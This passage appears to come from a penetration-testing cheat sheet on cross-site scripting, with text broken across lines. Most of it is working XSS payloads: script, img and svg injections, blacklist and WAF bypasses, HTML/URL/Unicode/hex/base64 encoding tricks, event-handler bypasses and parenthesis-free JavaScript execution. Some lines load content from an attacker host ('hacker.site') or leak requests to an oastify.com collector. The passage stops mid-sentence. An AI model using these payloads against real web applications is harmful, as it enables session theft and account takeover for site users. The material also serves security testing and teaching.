will\nvalidate the content\nto only allow letters, numbers, dots and underscores (\n[\\w\\._]\n).\nHowever, even with that limitation it's still possible to perform some actions. This is because you can use that valid chars to\naccess any element in the DOM\n:\nSome useful functions for this:\nfirstElementChild\nlastElementChild\nnextElementSibiling\nlastElementSibiling\nparentElement\nYou can also try to\ntrigger Javascript functions\ndirectly:\nobj.sales.delOrders\n.\nHowever, usually the endpoints executing the indicated function are endpoints without much interesting DOM,\nother pages in the same origin\nwill have a\nmore interesting DOM\nto perform more actions.\nTherefore, in order to\nabuse this vulnerability in a different DOM\nthe\nSame Origin Method Execution (SOME)\nexploitation was developed:\nSOME - Same Origin Method Execution\nDOM\nThere is\nJS code\nthat is using\nunsafely\nsome\ndata controlled by an attacker\nlike\nlocation.href\n. An attacker, could abuse this to execute arbitrary JS code.\nDOM XSS\nUniversal XSS\nThese kind of XSS can be found\nanywhere\n. They not depend just on the client exploitation of a web application but on\nany\ncontext\n. These kind of\narbitrary JavaScript execution\ncan even be abuse to obtain\nRCE\n,\nread\narbitrary\nfiles\nin clients and servers, and more.\nSome\nexamples\n:\nServer Side XSS (Dynamic PDF)\nElectron Desktop Apps\nWAF bypass encoding image\nfrom https://twitter.com/hackerscrolls/status/1273254212546281473?s=21\nInjecting inside raw HTML\nWhen your input is reflected\ninside the HTML page\nor you can escape and inject HTML code in this context the\nfirst\nthing you need to do if check if you can abuse\n<\nto create new tags: Just try to\nreflect\nthat\nchar\nand check if it's being\nHTML encoded\nor\ndeleted\nof if it is\nreflected without changes\n.\nOnly in the last case you will be able to exploit this case\n.\nFor this cases also\nkeep in mind\nClient Side Template Injection\n.\nNote: A HTML comment can be closed using\n-->\nor\n--!>\nIn this case and if no black/whitelisting is used, you could use payloads like:\n<\nscript\n>\nalert\n(\n1\n)\n</\nscript\n>\n<\nimg src\n=\nx onerror\n=\nalert\n(\n1\n)\n/>\n<\nsvg onload\n=\nalert\n(\n'XSS'\n)\n>\nBut, if tags/attributes black/whitelisting is being used, you will need to\nbrute-force which tags\nyou can create.\nOnce you have\nlocated which tags are allowed\n, you would need to\nbrute-force attributes/events\ninside the found valid tags to see how you can attack the context.\nTags/Events brute-force\nGo to\nhttps://portswigger.net/web-security/cross-site-scripting/cheat-sheet\nand click on\nCopy tags to clipboard\n. Then, send all of them using Burp intruder and check if any tags wasn't discovered as malicious by the WAF. Once you have discovered which tags you can use, you can\nbrute force all the events\nusing the valid tags (in the same web page click on\nCopy events to clipboard\nand follow the same procedure as before).\nCustom tags\nIf you didn't find any valid HTML tag, you could try to\ncreate a custom tag\nand and execute JS code with the\nonfocus\nattribute. In the XSS request, you need to end the URL with\n#\nto make the page\nfocus on that object\nand\nexecute\nthe code:\n/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x\nBlacklist Bypasses\nIf some kind of blacklist is being used you could try to bypass it with some silly tricks:\n//Random capitalization\n<\nscript\n>\n-->\n<\nScrIpT\n>\n<\nimg\n-->\n<\nImG\n‚Äã\n//Double tag, in case just the first match is removed\n<\nscript\n><\nscript\n>\n<\nscr\n<\nscript\n>\nipt\n>\n<\nSCRscriptIPT\n>\nalert\n(\n1\n)\n</\nSCRscriptIPT\n>\n‚Äã\n//You can substitude the space to separate attributes for:\n/\n/*%00/\n/%00*/\n%\n2F\n%\n0D\n%\n0C\n%\n0A\n%\n09\n‚Äã\n//Unexpected parent tags\n<\nsvg\n><\nx\n><\nscript\n>\nalert\n(\n'1'\n&\n#\n41\n</\nx\n>\n‚Äã\n//Unexpected weird attributes\n<\nscript x\n>\n<\nscript a\n=\n\"1234\"\n>\n<\nscript\n~~~>\n<\nscript\n/\nrandom\n>\nalert\n(\n1\n)\n</\nscript\n>\n<\nscript\n///Note the newline\n>\nalert\n(\n1\n)\n</\nscript\n>\n<\nscr\\x00ipt\n>\nalert\n(\n1\n)\n</\nscr\\x00ipt\n>\n‚Äã\n//Not closing tag, ending with \" <\" or \" //\"\n<\niframe\nSRC\n=\n\"javascript:alert('XSS');\"\n<\n<\niframe\nSRC\n=\n\"javascript:alert('XSS');\"\n//\n‚Äã\n//Extra open\n<<\nscript\n>\nalert\n(\n\"XSS\"\n);\n//<</script>\n‚Äã\n//Just weird an unexpected, use your imagination\n<</\nscript\n/\nscript\n><\nscript\n>\n<\ninput type\n=\nimage src onerror\n=\n\"prompt(1)\"\n>\n‚Äã\n//Using `` instead of parenthesis\nonerror\n=\nalert\n`\n1\n`\n‚Äã\n//Use more than one\n<<\nTexTArEa\n/*%00//%00*/\na\n=\n\"not\"\n/*%00///AutOFocUs////onFoCUS=alert`1` //\nLength bypass (small XSSs)\nMore tiny XSS for different environments\npayload\ncan be found here\nand\nhere\n.\n<!-- Taken from the blog of Jorge Lajara -->\n<svg/onload=alert``>\n<\nscript\nsrc\n=\n//aa.es\n>\n<\nscript\nsrc\n=\n//‚Ñ°„èõ.pw\n>\nThe last one is using 2 unicode characters which expands to 5: telsr\nMore of these characters can be found\nhere\n.\nTo check in which characters are decomposed check\nhere\n.\nClick XSS - Clickjacking\nIf in order to exploit the vulnerability you need the\nuser to click a link or a form\nwith prepopulated data you could try to\nabuse Clickjacking\n(if the page is vulnerable).\nImpossible - Dangling Markup\nIf you just think that\nit's impossible to create an HTML tag with an attribute to execute JS code\n, you should check\nDanglig Markup\nbecause you could\nexploit\nthe vulnerability\nwithout\nexecuting\nJS\ncode.\nInjecting inside HTML tag\nInside the tag/escaping from attribute value\nIf you are in\ninside a HTML tag\n, the first thing you could try is to\nescape\nfrom the tag and use some of the techniques mentioned in the\nprevious section\nto execute JS code.\nIf you\ncannot escape from the tag\n, you could create new attributes inside the tag to try to execute JS code, for example using some payload like (\nnote that in this example double quotes are use to escape from the attribute, you won't need them if your input is reflected directly inside the tag\n):\n\" autofocus onfocus=alert(document.domain) x=\"\n\"\nonfocus\n=\nalert\n(\n1\n)\nid\n=\nx\ntabindex\n=\n0\nstyle\n=\ndisplay:block\n>\n#x #Access http://site.com/?#x t\nStyle events\n<\np style\n=\n\"animation: x;\"\nonanimationstart\n=\n\"alert()\"\n>\nXSS\n</\np\n>\n<\np style\n=\n\"animation: x;\"\nonanimationend\n=\n\"alert()\"\n>\nXSS\n</\np\n>\n‚Äã\n#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:\n<\ndiv style\n=\n\"position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;\"\nonclick\n=\n\"alert(1)\"\n></\ndiv\n>\n#moving your mouse anywhere over the page (0-click-ish):\n<\ndiv style\n=\n\"position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;\"\nonmouseover\n=\n\"alert(1)\"\n></\ndiv\n>\nWithin the attribute\nEven if you\ncannot escape from the attribute\n(\n\"\nis being encoded or deleted), depending on\nwhich attribute\nyour value is being reflected in\nif you control all the value or just a part\nyou will be able to abuse it. For\nexample\n, if you control an event like\nonclick=\nyou will be able to make it execute arbitrary code when it's clicked.\nAnother interesting\nexample\nis the attribute\nhref\n, where you can use the\njavascript:\nprotocol to execute arbitrary code:\nhref=\"javascript:alert(1)\"\nBypass inside event using HTML encoding/URL encode\nThe\nHTML encoded characters\ninside the value of HTML tags attributes are\ndecoded on runtime\n. Therefore something like the following will be valid (the payload is in bold):\n<a id=\"author\" href=\"http://none\" onclick=\"var tracker='http://foo?\n&apos;-alert(1)-&apos;\n';\">Go Back </a>\nNote that\nany kind of HTML encode is valid\n:\n//HTML entities\n&\napos\n;\n-\nalert\n(\n1\n)\n-&\napos\n;\n//HTML hex without zeros\n&\n#x27\n-\nalert\n(\n1\n)\n-&\n#x27\n//HTML hex with zeros\n&\n#x00027\n-\nalert\n(\n1\n)\n-&\n#x00027\n//HTML dec without zeros\n&\n#\n39\n-\nalert\n(\n1\n)\n-&\n#\n39\n//HTML dec with zeros\n&\n#\n00039\n-\nalert\n(\n1\n)\n-&\n#\n00039\n‚Äã\n<\na href\n=\n\"javascript:var a='&apos;-alert(1)-&apos;'\"\n>\na\n</\na\n>\n<\na href\n=\n\"&#106;avascript:alert(2)\"\n>\na\n</\na\n>\n<\na href\n=\n\"jav&#x61script:alert(3)\"\n>\na\n</\na\n>\nNote that URL encode will also work:\n<\na href\n=\n\"https://example.com/lol%22onmouseover=%22prompt(1);%20img.png\"\n>\nClick\n</\na\n>\nBypass inside event using Unicode encode\n//For some reason you can use unicode to encode \"alert\" but not \"(1)\"\n<\nimg src onerror\n=\n\\u0061\\u006C\\u0065\\u0072\\\nu0074\n(\n1\n)\n/>\n<\nimg src onerror\n=\n\\u\n{\n61\n}\n\\u\n{\n6C\n}\n\\u\n{\n65\n}\n\\u\n{\n72\n}\n\\u\n{\n74\n}(\n1\n)\n/>\nSpecial Protocols Within the attribute\nThere you can use the protocols\njavascript:\nor\ndata:\nin some places to\nexecute arbitrary JS code\n. Some will require user interaction on some won't.\njavascript\n:\nalert\n(\n1\n)\nJavaSCript\n:\nalert\n(\n1\n)\njavascript\n:%\n61\n%\n6c\n%\n65\n%\n72\n%\n74\n%\n28\n%\n31\n%\n29\n//URL encode\njavascript\n&\ncolon\n;\nalert\n(\n1\n)\njavascript\n&\n#x003A\n;\nalert\n(\n1\n)\njavascript\n&\n#\n58\n;\nalert\n(\n1\n)\n&\n#x6a\n&\n#x61\n&\n#x76\n&\n#x61\n&\n#x73\n&\n#x63\n&\n#x72\n&\n#x69\n&\n#x70\n&\n#x74\n&\n#x3aalert\n(\n1\n)\njava\n//Note the new line\nscript\n:\nalert\n(\n1\n)\n‚Äã\ndata\n:\ntext\n/\nhtml\n,\n<\nscript\n>\nalert\n(\n1\n)\n</\nscript\n>\nDaTa\n:\ntext\n/\nhtml\n,\n<\nscript\n>\nalert\n(\n1\n)\n</\nscript\n>\ndata\n:\ntext\n/\nhtml\n;\ncharset\n=\niso\n-\n8859\n-\n7\n,\n%\n3c\n%\n73\n%\n63\n%\n72\n%\n69\n%\n70\n%\n74\n%\n3e\n%\n61\n%\n6c\n%\n65\n%\n72\n%\n74\n%\n28\n%\n31\n%\n29\n%\n3c\n%\n2f\n%\n73\n%\n63\n%\n72\n%\n69\n%\n70\n%\n74\n%\n3e\ndata\n:\ntext\n/\nhtml\n;\ncharset\n=\nUTF\n-\n8\n,\n<\nscript\n>\nalert\n(\n1\n)\n</\nscript\n>\ndata\n:\ntext\n/\nhtml\n;\nbase64\n,\nPHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4\n=\ndata\n:\ntext\n/\nhtml\n;\ncharset\n=\nthing\n;\nbase64\n,\nPHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg\ndata\n:\nimage\n/\nsvg\n+\nxml\n;\nbase64\n,\nPHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI\n+\nYWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg\n==\nPlaces where you can inject these protocols\nIn general\nthe\njavascript:\nprotocol can be\nused in any tag that accepts the attribute\nhref\nand in\nmost\nof the tags that accepts the\nattribute\nsrc\n(but not\n<img\n)\n<\na\nhref\n=\n\"\njavascript:alert(1)\n\"\n>\n<\na\nhref\n=\n\"\ndata:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\n\"\n>\n<\nform\naction\n=\n\"\njavascript:alert(1)\n\"\n>\n<\nbutton\n>\nsend\n</\nbutton\n>\n</\nform\n>\n<\nform\nid\n=\nx\n>\n</\nform\n>\n<\nbutton\nform\n=\n\"\nx\n\"\nformaction\n=\n\"\njavascript:alert(1)\n\"\n>\nsend\n</\nbutton\n>\n<\nobject\ndata\n=\njavascript:alert(3)\n>\n<\niframe\nsrc\n=\njavascript:alert(2)\n>\n<\nembed\nsrc\n=\njavascript:alert(1)\n>\n‚Äã\n<\nobject\ndata\n=\n\"\ndata:text/html,<script>alert(5)</script>\n\"\n>\n<\nembed\nsrc\n=\n\"\ndata:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+\n\"\ntype\n=\n\"\nimage/svg+xml\n\"\nAllowScriptAccess\n=\n\"\nalways\n\"\n>\n</\nembed\n>\n<\nembed\nsrc\n=\n\"\ndata:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\n\"\n>\n</\nembed\n>\n<\niframe\nsrc\n=\n\"\ndata:text/html,<script>alert(5)</script>\n\"\n>\n</\niframe\n>\n‚Äã\n//Special cases\n<\nobject\ndata\n=\n\"\n//hacker.site/xss.swf\n\"\n>\n.//https://github.com/evilcos/xss.swf\n<\nembed\ncode\n=\n\"\n//hacker.site/xss.swf\n\"\nallowscriptaccess\n=\nalways\n>\n//https://github.com/evilcos/xss.swf\n<\niframe\nsrcdoc=\"<svg\nonload\n=\nalert\n(\n4\n);\n>\n\"\n>\nOther obfuscation tricks\nIn this case the HTML encoding and the Unicode encoding trick from the previous section is also valid as you are inside an attribute.\n<\na href\n=\n\"javascript:var a='&apos;-alert(1)-&apos;'\"\n>\nMoreover, there is another\nnice trick\nfor these cases:\nEven if your input inside\njavascript:...\nis being URL encoded, it will be URL decoded before it's executed.\nSo, if you need to\nescape\nfrom the\nstring\nusing a\nsingle quote\nand you see that\nit's being URL encoded\n, remember that\nit doesn't matter,\nit will be\ninterpreted\nas a\nsingle quote\nduring the\nexecution\ntime.\n&\napos\n;\n-\nalert\n(\n1\n)\n-&\napos\n;\n%\n27\n-\nalert\n(\n1\n)\n-%\n27\n<\niframe src\n=\njavascript\n:%\n61\n%\n6c\n%\n65\n%\n72\n%\n74\n%\n28\n%\n31\n%\n29\n></\niframe\n>\nNote that if you try to\nuse both\nURLencode + HTMLencode\nin any order to encode the\npayload\nit\nwon't\nwork\n, but you can\nmix them inside the payload\n.\nUsing Hex and Octal encode with\njavascript:\nYou can use\nHex\nand\nOctal encode\ninside the\nsrc\nattribute of\niframe\n(at least) to declare\nHTML tags to execute JS\n:\n//Encoded: <svg onload=alert(1)>\n// This WORKS\n<\niframe src\n=\njavascript\n:\n'\\x3c\\x73\\x76\\x67\\x20\\x6f\\x6e\\x6c\\x6f\\x61\\x64\\x3d\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29\\x3e'\n/>\n<\niframe src\n=\njavascript\n:\n'\\74\\163\\166\\147\\40\\157\\156\\154\\157\\141\\144\\75\\141\\154\\145\\162\\164\\50\\61\\51\\76'\n/>\n‚Äã\n//Encoded: alert(1)\n// This doesn't work\n<\nsvg onload\n=\njavascript\n:\n'\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29'\n/>\n<\nsvg onload\n=\njavascript\n:\n'\\141\\154\\145\\162\\164\\50\\61\\51'\n/>\nReverse tab nabbing\n<\na target\n=\n\"_blank\"\nrel\n=\n\"opener\"\nIf you can inject any URL in an arbitrary\n<a href=\ntag that contains the\ntarget=\"_blank\" and rel=\"opener\"\nattributes, check the\nfollowing page to exploit this behavior\n:\nReverse Tab Nabbing\non Event Handlers Bypass\nFirst of all check this page (\nhttps://portswigger.net/web-security/cross-site-scripting/cheat-sheet\n) for useful\n\"on\" event handlers\n.\nIn case there is some blacklist preventing you from creating this even handlers you can try the following bypasses:\n<\nsvg onload\n%\n09\n=\nalert\n(\n1\n)\n>\n//No safari\n<\nsvg\n%\n09onload\n=\nalert\n(\n1\n)\n>\n<\nsvg\n%\n09onload\n%\n20\n=\nalert\n(\n1\n)\n>\n<\nsvg onload\n%\n09\n%\n20\n%\n28\n%\n2c\n%\n3b\n=\nalert\n(\n1\n)\n>\n‚Äã\n//chars allowed between the onevent and the \"=\"\nIExplorer\n:\n%\n09\n%\n0B\n%\n0C\n%\n020\n%\n3B\nChrome\n:\n%\n09\n%\n20\n%\n28\n%\n2C\n%\n3B\nSafari\n:\n%\n2C\n%\n3B\nFirefox\n:\n%\n09\n%\n20\n%\n28\n%\n2C\n%\n3B\nOpera\n:\n%\n09\n%\n20\n%\n2C\n%\n3B\nAndroid\n:\n%\n09\n%\n20\n%\n28\n%\n2C\n%\n3B\nXSS in \"Unexploitable tags\" (hidden input, link, canonical, meta)\nFrom\nhere\nit's now possible to abuse hidden inputs with:\n<\nbutton\npopvertarget\n=\n\"\nx\n\"\n>\nClick me\n</\nbutton\n>\n<\ninput\ntype\n=\n\"\nhidden\n\"\nvalue\n=\n\"\ny\n\"\npopover\nid\n=\n\"\nx\n\"\nonbeforetoggle\n=\nalert(1)\n>\nAnd in\nmeta tags\n:\n<!-- Injection inside meta attribute-->\n<\nmeta\nname\n=\n\"\napple-mobile-web-app-title\n\"\ncontent\n=\n\"\"\nTwitter\npopover\nid\n=\n\"\nnewsletter\n\"\nonbeforetoggle\n=\nalert(2)\n/>\n<!-- Existing target-->\n<\nbutton\npopovertarget\n=\n\"\nnewsletter\n\"\n>\nSubscribe to newsletter\n</\nbutton\n>\n<\ndiv\npopover\nid\n=\n\"\nnewsletter\n\"\n>\nNewsletter popup\n</\ndiv\n>\nFrom\nhere\n: You can execute an\nXSS payload inside a hidden attribute\n, provided you can\npersuade\nthe\nvictim\ninto pressing the\nkey combination\n. On Firefox Windows/Linux the key combination is\nALT+SHIFT+X\nand on OS X it is\nCTRL+ALT+X\n. You can specify a different key combination using a different key in the access key attribute. Here is the vector:\n<\ninput\ntype\n=\n\"\nhidden\n\"\naccesskey\n=\n\"\nX\n\"\nonclick\n=\n\"\nalert\n(\n1\n)\n\"\n>\nThe XSS payload will be something like this:\n\" accesskey=\"x\" onclick=\"alert(1)\" x=\"\nBlacklist Bypasses\nSeveral tricks with using different encoding were exposed already inside this section. Go\nback to learn where can you use:\nHTML encoding (HTML tags)\nUnicode encoding (can be valid JS code):\n\\u0061lert(1)\nURL encoding\nHex and Octal encoding\ndata encoding\nBypasses for HTML tags and attributes\nRead the\nBlacklist Bypasses of the previous section\n.\nBypasses for JavaScript code\nRead the J\navaScript bypass blacklist of the following section\n.\nCSS-Gadgets\nIf you found a\nXSS in a very small part\nof the web that requires some kind of interaction (maybe a small link in the footer with an onmouseover element), you can try to\nmodify the space that element occupies\nto maximize the probabilities of have the link fired.\nFor example, you could add some styling in the element like:\nposition: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5\nBut, if the WAF is filtering the style attribute, you can use CSS Styling Gadgets, so if you find, for example\n.test {display:block; color: blue; width: 100%}\nand\n#someid {top: 0; font-family: Tahoma;}\nNow you can modify our link and bring it to the form\n<a href=‚Äù‚Äù id=someid class=test onclick=alert() a=‚Äù‚Äù>\nThis trick was taken from\nhttps://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703\n‚Äã\nInjecting inside JavaScript code\nIn these case you\ninput\nis going to be\nreflected inside the JS code\nof a\n.js\nfile or between\n<script>...</script>\ntags or between HTML events that can execute JS code or between attributes that accepts the\njavascript:\nprotocol.\nEscaping <script> tag\nIf your code is inserted within\n<script> [...] var input = 'reflected data' [...] </script>\nyou could easily\nescape closing the\n<script>\ntag:\n</\nscript\n><\nimg src\n=\n1\nonerror\n=\nalert\n(\ndocument\n.\ndomain\n)\n>\nNote that in this example we\nhaven't even closed the single quote\n, but that's not necessary as the\nbrowser first performs HTML parsing\nto identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts.\nInside JS code\nIf\n<>\nare being sanitised you can still\nescape the string\nwhere your input is being\nlocated\nand\nexecute arbitrary JS\n. It's important to\nfix JS syntax\n, because if there are any errors, the JS code won't be executed:\n'-alert(document.domain)-'\n';alert(document.domain)//\n\\';alert(document.domain)//\nTemplate literals ``\nIn order to construct\nstrings\napart from single and double quotes JS also accepts\nbackticks\n``\n. This is known as template literals as they allow to\nembedded JS expressions\nusing\n${ ... }\nsyntax.\nTherefore, if you find that your input is being\nreflected\ninside a JS string that is using backticks, you can abuse the syntax\n${ ... }\nto execute\narbitrary JS code\n:\nThis can be\nabused\nusing:\n`\n${\nalert\n(\n1\n)\n}\n`\n`\n${\n`$\n{\n`\n${\n`\n${\nalert\n(\n1\n)\n}\n`\n}\n`\n}\n`\n}\n`\n// This is valid JS code, because each time the function returns itself it's recalled with ``\nfunction\nloop\n(){\nreturn\nloop\n}\nloop\n``````````````\nEncoded code execution\n<\nscript\n>\n\\\nu0061lert\n(\n1\n)\n</\nscript\n>\n<\nsvg\n>\n<\nscript\n>\nalert\n&\nlpar\n;\n'1'\n&\nrpar\n;\n<\nsvg\n><\nscript\n>&\n#x61\n;\n&\n#x6C\n;\n&\n#x65\n;\n&\n#x72\n;\n&\n#x74\n;\n&\n#x28\n;\n&\n#x31\n;\n&\n#x29\n;\n</\nscript\n>\n</\nsvg\n>\n<\n!--\nThe\nsvg\ntags\nare\nneccesary\n<iframe\nsrcdoc\n=\n\"\n<SCRIPT>\n&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;\n</iframe>\n\"\n>\nUnicode Encode JS execution\n\\u\n{\n61\n}\nlert\n(\n1\n)\n\\\nu0061lert\n(\n1\n)\n\\u\n{\n0061\n}\nlert\n(\n1\n)\nJavaScript bypass blacklists techniques\nStrings\n\"thisisastring\"\n'thisisastrig'\n`\nthisisastring\n`\n/\nthisisastring\n/\n==\n\"/thisisastring/\"\n/\nthisisastring\n/\n.\nsource\n==\n\"thisisastring\"\n\"\\h\\e\\l\\l\\o\"\nString\n.\nfromCharCode\n(\n116\n,\n104\n,\n105\n,\n115\n,\n105\n,\n115\n,\n97\n,\n115\n,\n116\n,\n114\n,\n105\n,\n110\n,\n103\n)\n\"\\x74\\x68\\x69\\x73\\x69\\x73\\x61\\x73\\x74\\x72\\x69\\x6e\\x67\"\n\"\\164\\150\\151\\163\\151\\163\\141\\163\\164\\162\\151\\156\\147\"\n\"\\u0074\\u0068\\u0069\\u0073\\u0069\\u0073\\u0061\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\"\n\"\\u{74}\\u{68}\\u{69}\\u{73}\\u{69}\\u{73}\\u{61}\\u{73}\\u{74}\\u{72}\\u{69}\\u{6e}\\u{67}\"\n\"\\a\\l\\ert\\(1\\)\"\natob\n(\n\"dGhpc2lzYXN0cmluZw==\"\n)\neval\n(\n8680439.\n.\ntoString\n(\n30\n))(\n983801.\n.\ntoString\n(\n36\n))\nSpecial escapes\n'\\b'\n//backspace\n'\\f'\n//form feed\n'\\n'\n//new line\n'\\r'\n//carriage return\n'\\t'\n//tab\n'\\b'\n//backspace\n'\\f'\n//form feed\n'\\n'\n//new line\n'\\r'\n//carriage return\n'\\t'\n//tab\n// Any other char escaped is just itself\nSpace substitutions inside JS code\n<\nTAB\n>\n/**/\nJavaScript comments (from\nJavaScript Comments\ntrick)\n//This is a 1 line comment\n/* This is a multiline comment*/\n<!--\nThis is a 1line comment\n#\n!\nThis is a\n1\nline comment\n,\nbut\n\"#!\"\nmust to be at the beggining\nof\nthe first line\n-->\nThis is a\n1\nline comment\n,\nbut\n\"-->\"\nmust to be at the beggining\nof\nthe first line\nJavaScript new lines (from\nJavaScript new line\ntrick)\n//Javascript interpret as new line these chars:\nString\n.\nfromCharCode\n(\n10\n);\nalert\n(\n'//\\nalert(1)'\n)\n//0x0a\nString\n.\nfromCharCode\n(\n13\n);\nalert\n(\n'//\\ralert(1)'\n)\n//0x0d\nString\n.\nfromCharCode\n(\n8232\n);\nalert\n(\n'//\\u2028alert(1)'\n)\n//0xe2 0x80 0xa8\nString\n.\nfromCharCode\n(\n8233\n);\nalert\n(\n'//\\u2029alert(1)'\n)\n//0xe2 0x80 0xa9\nJavaScript whitespaces\nlog\n=\n[];\nfunction\nfunct\n(){}\nfor\n(\nlet\ni\n=\n0\n;\ni\n<=\n0x10ffff\n;\ni\n++\n){\ntry\n{\neval\n(\n`\nfunct\n${\nString\n.\nfromCodePoint\n(\ni\n)\n}\n()\n`\n);\nlog\n.\npush\n(\ni\n);\n}\ncatch\n(\ne\n){}\n}\nconsole\n.\nlog\n(\nlog\n)\n//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279\n‚Äã\n//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:\n<\nimg\n/\nsrc\n/\nonerror\n=\nalert\n&\n#\n65279\n;(\n1\n)\n>\nJavascript inside a comment\n//If you can only inject inside a JS comment, you can still leak something\n//If the user opens DevTools request to the indicated sourceMappingURL will be send\n‚Äã\n//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com\nJavaScript without parentheses\n// By setting location\nwindow\n.\nlocation\n=\n'javascript:alert\\x281\\x29'\nx\n=\nnew\nDOMMatrix\n;\nmatrix\n=\nalert\n;\nx\n.\na\n=\n1337\n;\nlocation\n=\n'javascript'\n+\n':'\n+\nx\n// or any DOMXSS sink such as location=name\n‚Äã\n// Backtips\n// Backtips pass the string as an array of lenght 1\nalert\n`\n1\n`\n‚Äã\n// Backtips + Tagged Templates + call/apply\neval\n`\nalert\\x281\\x29\n`\n// This won't work as it will just return the passed array\nsetTimeout\n`\nalert\\x281\\x29\n`\neval\n.\ncall\n`\n${\n'alert\\x281\\x29'\n}\n`\neval\n.\napply\n`\n${\n[\n`\nalert\\x281\\x29\n`\n]\n}\n`\n[].\nsort\n.\ncall\n`\n${\nalert\n}\n1337\n`\n[].\nmap\n.\ncall\n`\n${\neval\n}\n\\\\u{61}lert\\x281337\\x29\n`\n‚Äã\n// To pass several arguments you can use\nfunction\nbtt\n(){\nconsole\n.\nlog\n(\narguments\n);\n}\nbtt\n`\n${\n'arg1'\n}${\n'arg2'\n}${\n'arg3'\n}\n`\n‚Äã\n//It's possible to construct a function and call it\nFunction\n`\nx\n${\n'alert(1337)'\n}\nx\n```\n‚Äã\n// .replace can use regexes and call a function if something is found\n\"a,\"\n.\nreplace\n`\na\n${\nalert\n}\n`\n//Initial [\"a\"] is passed to str as \"a,\" and thats why the initial string is \"a,\"\n\"a\"\n.\nreplace\n.\ncall\n`\n1\n${\n/\n.\n/\n}${\nalert\n}\n`\n// This happened in the previous example\n// Change \"this\" value of call to \"1,\"\n// match anything with regex /./\n// call alert with \"1\"\n\"a\"\n.\nreplace\n.\ncall\n`\n1337\n${\n/...\n.\n/\n}${\nalert\n}\n`\n//alert with 1337 instead\n‚Äã\n// Using Reflect.apply to call any function with any argumnets\nReflect\n.\napply\n.\ncall\n`\n${\nalert\n}${\nwindow\n}${\n[\n1337\n]\n}\n`\n//Pass the function to call (‚Äúalert‚Äù), then the ‚Äúthis‚Äù value to that function (‚Äúwindow‚Äù) which avoids the illegal invocation error and finally an array of arguments to pass to the function.\nReflect\n.\napply\n.\ncall\n`\n${\nnavigation\n.\nnavigate\n}${\nnavigation\n}${\n[\nname\n]\n}\n`\n// Using Reflect.set to call set any value to a variable\nReflect\n.\nset\n.\ncall\n`\n${\nlocation\n}${\n'href'\n}${\n'javascript:alert\\x281337\\x29'\n}\n`\n// It requires a valid object in the first argument (‚Äúlocation‚Äù), a property in the second argument and a value to assign in the third.\n‚Äã\n‚Äã\n‚Äã\n// valueOf, toString\n// These operations are called when the object is used as a primitive\n// Because the objet is passed as \"this\" and alert() needs \"window\" to be the value of \"this\", \"window\" methods are used\nvalueOf\n=\nalert\n;\nwindow\n+\n''\ntoString\n=\nalert\n;\nwindow\n+\n''\n‚Äã\n‚Äã\n// Error handler\nwindow\n.\nonerror\n=\neval\n;\nthrow\n\"=alert\\x281\\x29\"\n;\nonerror\n=\neval\n;\nthrow\n\"=alert\\x281\\x29\"\n;\n<\nimg src\n=\nx onerror\n=\n\"window.onerror=eval;throw'=alert\\x281\\x29'\"\n>\n{\nonerror\n=\neval\n}\nthrow\n\"=alert(1)\"\n//No \";\"\nonerror\n=\nalert\n//No \";\" using new line\nthrow\n1337\n// Error handler + Special unicode separators\neval\n(\n\"onerror=\\u2028alert\\u2029throw 1337\"\n);\n// Error handler + Comma separator\n// The comma separator goes through the list and returns only the last element\nvar\na\n=\n(\n1\n,\n2\n,\n3\n,\n4\n,\n5\n,\n6\n)\n// a = 6\nthrow\nonerror\n=\nalert\n,\n1337\n// this is throw 1337, after setting the onerror event to alert\nthrow\nonerror\n=\nalert\n,\n1\n,\n1\n,\n1\n,\n1\n,\n1\n,\n1337\n// optional exception variables inside a catch clause.\ntry\n{\nthrow\nonerror\n=\nalert\n}\ncatch\n{\nthrow\n1\n}\n‚Äã\n‚Äã\n// Has instance 